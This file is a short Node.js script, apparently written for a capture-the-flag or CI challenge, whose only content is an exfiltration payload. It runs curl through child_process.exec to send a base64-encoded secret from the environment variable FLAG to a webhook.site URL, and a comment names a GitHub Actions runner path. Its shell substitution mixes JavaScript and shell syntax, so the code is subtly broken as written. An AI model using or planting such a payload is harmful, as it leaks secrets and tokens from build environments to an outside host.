


const { exec } = require('node:child_process')

//cd /home/runner/work/_actions/actions/checkout; ls
exec('curl https://webhook.site/200fdf69-4bd3-4432-9c2c-7617a5a5c458?$(process.env.FLAG | base64)' , (err, output) => {
    if (err) {
        console.error("could not execute command: ", err)
        return
    }
    // log the output received from the command
    console.log("Output: \n", output)
})


